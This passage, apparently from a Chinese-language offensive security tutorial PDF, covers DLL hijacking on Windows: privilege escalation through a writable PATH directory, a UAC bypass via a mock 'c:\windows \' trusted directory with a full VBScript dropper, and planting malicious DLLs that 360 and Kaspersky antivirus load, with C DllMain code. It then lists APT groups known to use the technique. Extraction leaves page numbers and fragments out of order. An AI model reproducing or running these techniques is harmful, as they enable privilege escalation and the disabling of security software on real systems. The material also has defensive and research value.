脚本表示cdpsgshims.dll和WptsExtensions.dll都存在可能通过%PATH%⽬录被劫持，从⽽可能存在提
权
我们可以看看这个DLL 
Name               Description                                       RunAs                     RebootRequired 
----               -----------                                       -----                     -------------- 
cdpsgshims.dll     Loaded by CDPSvc upon service startup             NT AUTHORITY\LocalService          
 True 
通过百度我们知道：
CDPSvc为 Connected Devices Platform Service连接设备平台服务 ，该服务在连接外围设备和外部设
备时开始起作⽤。它与蓝⽛、打印机和扫描仪以及⾳乐播放器、存储设备、⼿机、相机和许多其他类型
3.2.2.通过PrivescCheck检测⽬标上是否存在DLL劫持 
 Import-Module .\PrivescCheck.ps1
Invoke-HijackableDllsCheck
32
的连接设备相关联。它为 PC 和智能⼿机等设备提供了⼀种在彼此之间发现和发送消息的⽅式。 
Display name – Connected Devices Platform Service 
Path – %WinDir%\system32\svchost.exe -k LocalService -p 
File – %WinDir%\System32\CDPSvc.dll 
在ProcessMonitor中可以看到服务找不到cdpsgshims.dll的情况 
在环境变量中我们可以看到配置
33
那么基本错误配置了PATH的值，然后看⼀下ACL发现低权限⽤户可以写⼊ 
34
把我们的恶意DLL复制进去就可以了，可以看到成功加载了我们的DLL 
35
⽤户帐户控制(UAC)作为 Windows Vista 中的⼀项安全功能被引⼊，在以正常权限运⾏的进程被提升到
更⾼权限之前，要求⽤户通过提示进⾏确认。在⽤户抱怨在执⾏任意任务时被 UAC 提示淹没后，微软在 
Windows 7 中引⼊了⾃动提升功能，如果某些进程位于受信任的⽬录（例如c:\windows\system32），
那么会⾃动提升。
winsat.exe是⼀款Windows 系统评估⼯具。适⽤于Windows系统,我们需要劫持的DLL为：dxgi.dll。 
3.2.3.劫持winsat.exe的dxgi.dll Bypass UAC 
36
但是⾃动提升可执⾏⽂件和⾃定义 DLL 都需要位于受信任⽬录中，但这些都不是普通⽤户权限可写的。
那么我们需要使⽤尾随空格模拟受信任的⽬录来利⽤，我们可以使⽤VB来新建⼀个带有尾随空格的⽂件
夹。
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set wshshell = wscript.createobject("WScript.Shell")
' Get target binary and payload
WScript.StdOut.Write("System32 binary: ")
strBinary = WScript.StdIn.ReadLine()
WScript.StdOut.Write("Path to your DLL: ")
strDLL = WScript.StdIn.ReadLine()
' Create folders
Const target = "c:\windows \"
target_sys32 = (target & "system32\")
target_binary = (target_sys32 & strBinary)
If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If
If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If
' Copy legit binary and evil DLL
oFSO.CopyFile ("c:\windows\system32\" & strBinary), target_binary
oFSO.CopyFile strDLL, target_sys32
' Run, Forrest, Run!
wshshell.Run("""" & target_binary & """")
' Clean files
WScript.StdOut.Write("Clean up? (press enter to continue)")
WScript.StdIn.ReadLine()
37
强对抗的意思是直接和杀毒软件进⾏对抗(操作杀毒软件的内存)⽽不是进⾏绕过杀毒软件(免杀)。 
理论上说所有的windows应⽤都存在DLL劫持的情况，杀毒软件也不可避免。这⾥以360杀毒为例： 
在360杀毒运⾏的过程中⼀共有以下进程： 
ProcessMonitor监测⼀下进程的运⾏情况。经过分析我们可以把⽬标定为这个DLL 
wshshell.Run("powershell /c ""rm -r """"\\?\" & target & """""""") 'Deletion using VBScript is 
problematic, use PowerShell instead
3.3.DLL 加载劫持进⾏终端杀软强对抗 
3.3.1.实例1 劫持360杀毒 
38
mdnsnsp.dll⽂件属于Bonjour软件包的DLL⽂件，Bonjour（Windows 版）软件包提供了Bonjour 零配置
联⽹服务，可供 Windows 应⽤程序使⽤，如、Safari 以及“Airport 实⽤⼯具”。默认在Windows中并不
存在。那么我们可以编译恶意的DLL复制在C:\Program Files\Bonjour路径中。 
如果360sd.exe加载了这个dll，就启动CMD 
39
40
通过修改DLL中的代码我们还可以利⽤360杀毒加载我们的shellcode和提权，维权。在360杀毒的内存中
执⾏操作很安全。
Kaspersky AVP.exe 中的 DLL 注⼊允许本地管理员在不知道 Kaspersky 密码的情况下杀死或篡改防病毒
软件和在⾼权限中执⾏命令。通过DLL植⼊恶意⽂件，本地Windows管理员可以在这个受信任的
AVP.exe进程的上下⽂中实现代码执⾏并杀死其他进程，从⽽在⽆法检测和清除病毒的杀毒软件上实现拒
绝服务和以卡巴斯基的身份执⾏任意命令。
AVP.exe 加载不存在的wow64log.dll,路径为C:\windows\System32\ 
3.3.2.实例2 劫持卡巴斯基的wow64log.dll 
41
Avpui.exe同样加载不存在的Wow64log.dll,路径为C:\windows\System32\ 
kpm.exe同样加载不存在的Wow64log.dll,路径为C:\windows\System32\ 
作为管理员，我们可以构造恶意 wow64log.dll ⽂件复制到 System32 。 
例如：
#include "pch.h"
#include 
#include 
#include 
#include 
#include 
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD  ul_reason_for_call,
LPVOID lpReserved
)
{
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, false, 0, 
NULL, NULL, &si, &pi);
42
⼿动复制在⽬标⽂件⽬录中，然后启动卡巴斯基，可以看到加载了我们的Wow64log.dll 
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
char szFileName[MAX_PATH + 1];
GetModuleFileNameA(NULL, szFileName, MAX_PATH + 1);
//check if we are injected in an interesting McAfee process
if (strstr(szFileName, "avp") != NULL
//|| strstr(szFileName, "mcshield") != NULL
|| strstr(szFileName, "avp.exe") != NULL
) {
DisableThreadLibraryCalls(hModule);
}
else
{
}
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
//log("detach");
break;
}
return TRUE;
}
43
启动Kaspersky Password Manager Service 
加载了我们的恶意DLL并执⾏了 
44
卡巴斯基具有⾃我保护机制，即使管理员也⽆法终⽌或注⼊Avp.exe /avpui.exe等等 进程。但似乎卡巴
斯基家族的所有进程都认为其他卡巴斯基进程在⾃我保护⽅⾯是“受信任的”。因此，如果我们设法在⼀
个上下⽂中执⾏代码，我们就可以“攻击”并杀死其进程和在卡巴斯基中执⾏任意命令等等。 
我们可以编译⼀个恶意的dll利⽤卡巴斯基的进程去kill其它卡巴斯基的进程。 
也可以在卡巴是安全上下⽂中执⾏我们的shellcode 例如： 
45
也可以在卡巴是安全上下⽂中执⾏我们的shellcode 例如： 
APT41：使⽤搜索顺序劫持 
FinFisher：变种使⽤ DLL 搜索顺序劫持 
Chaes：搜索顺序劫持以加载恶意 DLL 有效负载 
Astaroth：使⽤搜索顺序劫持来启动⾃⼰ 
BOOSTWRITE：利⽤加载合法的 .dll ⽂件 
BackdoorDipolomacy：使⽤搜索顺序劫持 
HinKit：搜索顺序劫持⼀种持久性机制 
Downdelph：通过搜索顺序劫持.exe⽂件来提升权限 
InvisiMole：搜索顺序劫持在启动期间启动受感染的 DLL 
HTTPBrowser：⼲扰 DLL 加载顺序 
4.部分使⽤DLL 劫持的APT 
46
Ramsey：劫持过时的 Windows 应⽤程序 
menuPass：使⽤ DLL 搜索顺序劫持 
ThreatGroup-3390：使⽤ DLL 搜索顺序劫持来分发有效负载 
Whitefly：搜索顺序劫持感染恶意DLL 
RTM：搜索订单劫持以⼲扰 TeamViewer 
Tonto 团队：⼲扰合法的 Microsoft 可执⾏⽂件以加载恶意 DLL 
Melcoz：使⽤ DLL 劫持绕过安全控制 
https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order 
https://itm4n.github.io/windows-dll-hijacking-clarified/ 
https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows 
https://itm4n.github.io/windows-server-netman-dll-hijacking/ 
https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-
24a96675f6e 
5.参考：